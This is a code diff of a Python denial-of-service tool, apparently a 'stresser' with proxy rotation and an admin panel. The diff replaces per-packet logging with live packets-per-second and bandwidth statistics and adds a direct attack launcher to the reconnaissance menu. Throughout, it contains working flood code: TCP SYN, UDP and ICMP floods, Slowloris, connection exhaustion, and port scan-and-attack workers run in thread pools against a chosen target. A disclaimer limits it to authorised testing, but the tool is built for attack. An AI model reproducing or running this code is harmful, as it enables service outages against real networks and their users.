@@ -5,7 +5,7 @@
     │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (packet‑per‑line L4 output)
+    Author: bob (added bandwidth display for L4)
     Legal: For authorised testing only.
 """
 
@@ -373,9 +373,6 @@ proxy_lock = asyncio.Lock()        # to safely update proxy lists
 last_proxy_refresh = 0
 PROXY_REFRESH_INTERVAL = 300       # seconds
 
-# Lock for printing Layer 4 activity lines
-print_lock = threading.Lock()
-
 def parse_proxy_line(line):
     """Parse a proxy line which can be:
        - ip:port
@@ -738,6 +735,16 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
             p.join()
 
 # ================== LAYER 4 WORKERS ==================
+# Typical packet sizes (bytes) for bandwidth estimation
+PACKET_SIZE = {
+    'TCP SYN FLOOD': 40,      # IP + TCP header (no options)
+    'UDP FLOOD': 1024,        # typical large UDP payload
+    'ICMP FLOOD': 64,         # standard ping packet size
+    'SLOWLORIS': 150,         # approximate (partial HTTP request)
+    'CONNECTION EXHAUSTION': 40, # just TCP SYN (like SYN flood)
+    'PORT SCAN & ATTACK': 40, # SYN packets during scan
+}
+
 def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list):
     if not HAS_SCAPY:
         return
@@ -750,9 +757,6 @@ def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counte
             send(packet, verbose=False)
             req_counter.value += 1
             ports_hit_list.append(target_port)
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"TCP SYN FLOOD {target_ip}:{target_port} HEXID:{hex_id}")
         except:
             err_counter.value += 1
 
@@ -764,9 +768,6 @@ def udp_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, e
             sock.sendto(payload, (target_ip, target_port))
             req_counter.value += 1
             ports_hit_list.append(target_port)
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"UDP FLOOD {target_ip}:{target_port} HEXID:{hex_id}")
         except:
             err_counter.value += 1
 
@@ -780,9 +781,6 @@ def icmp_flood_worker(target_ip, worker_id, end_time, req_counter, err_counter):
             packet = ip / ICMP()
             send(packet, verbose=False)
             req_counter.value += 1
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"ICMP FLOOD {target_ip} HEXID:{hex_id}")
         except:
             err_counter.value += 1
 
@@ -798,17 +796,11 @@ def slowloris_worker(target_ip, target_port, worker_id, end_time, req_counter, e
             socks.append(sock)
             conn_counter.value += 1
             ports_hit_list.append(target_port)
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"SLOWLORIS {target_ip}:{target_port} HEXID:{hex_id}")
             time.sleep(5)
             for s in socks[-50:]:
                 try:
                     s.send(b"X-a: b\r\n")
                     req_counter.value += 1
-                    with print_lock:
-                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                        print(f"SLOWLORIS {target_ip}:{target_port} HEXID:{hex_id}")
                 except:
                     pass
         except:
@@ -823,9 +815,6 @@ def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time, re
             sock.connect((target_ip, target_port))
             conn_counter.value += 1
             ports_hit_list.append(target_port)
-            with print_lock:
-                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"CONNECTION EXHAUSTION {target_ip}:{target_port} HEXID:{hex_id}")
             time.sleep(10)
             sock.close()
         except:
@@ -847,9 +836,6 @@ def port_scan_worker(target_ip, worker_id, end_time, req_counter, err_counter, p
                     try:
                         sock.send(os.urandom(1024))
                         req_counter.value += 1
-                        with print_lock:
-                            hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                            print(f"PORT SCAN & ATTACK {target_ip}:{port} HEXID:{hex_id}")
                     except:
                         break
             sock.close()
@@ -904,11 +890,44 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req
     
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
-        # Wait for all threads to finish (they will exit when end_time is reached)
-        for f in futures:
-            f.result()  # This will block until the thread finishes (i.e., when end_time is reached)
-        # Attack finished
-        print(f"\n{current_color}Attack finished.{RESET}")
+        try:
+            while time.time() < end_time:
+                elapsed = time.time() - stats_start_time
+                reqs = req_counter.value
+                errs = err_counter.value
+                conns = conn_counter.value
+                ports_hit = len(set(ports_hit_list))
+                rps = reqs / elapsed if elapsed > 0 else 0
+                
+                # Estimate bandwidth
+                pkt_size = PACKET_SIZE.get(method, 512)  # default 512 bytes if unknown
+                bps = reqs * pkt_size * 8 / elapsed if elapsed > 0 else 0
+                if bps > 1e9:
+                    bw = f"{bps/1e9:.2f} Gbps"
+                elif bps > 1e6:
+                    bw = f"{bps/1e6:.2f} Mbps"
+                else:
+                    bw = f"{bps/1e3:.2f} Kbps"
+                
+                clear_screen()
+                print(f"{current_color}{BOLD}╔══ LAYER 4 ATTACK IN PROGRESS ══╗{RESET}\n")
+                print(f"{current_color}  Plan: {RESET}{plan_name}")
+                print(f"{current_color}  Method: {RESET}{method}")
+                print(f"{current_color}  Target: {RESET}{target_ip}")
+                if target_ports:
+                    print(f"{current_color}  Ports: {RESET}{target_ports[:5]}... ({len(target_ports)} total)")
+                print(f"{current_color}  Workers: {RESET}{workers}")
+                print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
+                print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
+                print(f"    Packets Sent: {reqs:,}")
+                print(f"    Errors: {errs:,}")
+                print(f"    PPS: {rps:.2f}")
+                print(f"    Bandwidth: {bw}")
+                print(f"    Active Connections: {conns:,}")
+                print(f"    Ports Hit: {ports_hit}")
+                await asyncio.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n\n{current_color}attack interrupted.{RESET}")
 
 # ================== METHOD SELECTION ==================
 def select_method():
@@ -1218,15 +1237,62 @@ def reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter):
         except:
             duration = 60
         
-        # Reuse the main Layer 4 attack function (it will print per-packet lines)
-        # We need to pass the ports somehow. The function will prompt for ports if needed.
-        # We'll set a global to bypass prompt? For simplicity, we'll just call the function and it will prompt.
-        # But we already have ports_input. We'll modify run_layer4_attack to accept target_ports as an optional argument.
-        # To avoid major changes, we'll temporarily monkey-patch input()? Not worth it.
-        # Instead, we'll create a new async function that calls run_layer4_attack with the ports already known.
-        # Since run_layer4_attack expects to ask for ports, we'll just call it and let the user re-enter the same ports.
-        print(f"\n{current_color}Now launching attack on {target} with ports {ports}...{RESET}")
-        asyncio.run(run_layer4_attack(target, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter))
+        stats_start_time = time.time()
+        req_counter.value = 0
+        err_counter.value = 0
+        ports_hit_list[:] = []
+        conn_counter.value = 0
+        
+        print(f"\n{current_color}{BOLD}Starting attack on {target} ports {ports}...{RESET}")
+        end_time = time.time() + duration
+        
+        worker_func_map = {
+            'TCP SYN FLOOD': tcp_syn_flood_worker,
+            'UDP FLOOD': udp_flood_worker,
+            'SLOWLORIS': slowloris_worker,
+            'CONNECTION EXHAUSTION': connection_exhaustion_worker,
+            'ICMP FLOOD': icmp_flood_worker,
+            'PORT SCAN & ATTACK': port_scan_worker,
+        }
+        worker_func = worker_func_map.get(method)
+        if not worker_func:
+            print("  Invalid method.")
+            return
+        
+        with ThreadPoolExecutor(max_workers=workers) as executor:
+            futures = []
+            for i in range(workers):
+                port = random.choice(ports)
+                if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
+                    futures.append(executor.submit(worker_func, target, port, i, end_time, req_counter, err_counter, ports_hit_list, conn_counter))
+                elif method == 'ICMP FLOOD':
+                    futures.append(executor.submit(worker_func, target, i, end_time, req_counter, err_counter))
+                elif method == 'PORT SCAN & ATTACK':
+                    futures.append(executor.submit(worker_func, target, i, end_time, req_counter, err_counter, ports_hit_list))
+            try:
+                while time.time() < end_time:
+                    elapsed = time.time() - stats_start_time
+                    reqs = req_counter.value
+                    errs = err_counter.value
+                    ports_hit = len(set(ports_hit_list))
+                    rps = reqs / elapsed if elapsed > 0 else 0
+                    
+                    pkt_size = PACKET_SIZE.get(method, 512)
+                    bps = reqs * pkt_size * 8 / elapsed if elapsed > 0 else 0
+                    if bps > 1e9:
+                        bw = f"{bps/1e9:.2f} Gbps"
+                    elif bps > 1e6:
+                        bw = f"{bps/1e6:.2f} Mbps"
+                    else:
+                        bw = f"{bps/1e3:.2f} Kbps"
+                    
+                    print(f"\r{current_color}[{elapsed:.1f}s] Packets: {reqs:,} | Errors: {errs:,} | PPS: {rps:.2f} | BW: {bw} | Ports Hit: {ports_hit}{RESET}", end="", flush=True)
+                    time.sleep(1)
+                print()
+            except KeyboardInterrupt:
+                print(f"\n\nAttack interrupted.")
+        elapsed = time.time() - stats_start_time
+        print(f"\nAttack finished. Total packets: {req_counter.value}, errors: {err_counter.value}, duration: {elapsed:.1f}s")
         input("  Press ENTER...")
     else:
         return
